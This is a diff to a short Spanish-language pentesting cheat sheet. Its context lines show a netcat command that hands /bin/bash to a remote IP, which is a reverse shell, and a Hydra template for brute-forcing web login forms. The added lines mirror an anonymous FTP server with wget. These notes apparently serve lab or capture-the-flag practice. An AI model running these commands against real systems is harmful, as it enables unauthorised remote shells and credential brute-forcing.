@@ -14,6 +14,9 @@ Conectarte a programa y redireccionar salida por nc
 Conectar programa a servidor en escucha y redireccionar salida por nc
     nc -lvvp [puerto]
     nc -v [ip] [puerto] -e /bin/bash
+    
+Descargar todo de ftp
+	wget -m --no-passive ftp://anonymous:anonymous@IP
 
 Hydra ->
 	hydra -l/-L user/userList -P dicc.lst -s PUERTO -f (cuando encuentra un resultado para) -t THREADS -vV URL http-get/post-form "/Path/:username=^USER^&password=^PASS^:Mensaje error"
